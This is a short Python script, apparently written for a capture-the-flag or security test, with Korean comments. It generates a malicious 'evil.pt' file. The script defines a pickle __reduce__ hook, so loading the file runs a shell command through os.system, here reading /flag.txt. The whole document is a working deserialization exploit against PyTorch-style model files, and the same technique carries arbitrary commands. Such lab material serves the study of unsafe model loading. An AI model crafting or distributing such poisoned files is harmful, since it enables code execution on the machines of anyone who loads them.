# Attack scenario (test)
# this is the script file which the attacker generates evil .pt file in his local PC

import pickle, os, io

class RCE:
    def __reduce__(self):
        # stdout로 바로 플래그 내용이 나오도록
        return (os.system, ("cat /flag.txt",))

buf = io.BytesIO()
pickle.dump(RCE(), buf)     # .pt는 사실상 pickle이기 때문
open("evil.pt", "wb").write(buf.getvalue())
print("evil.pt generated")
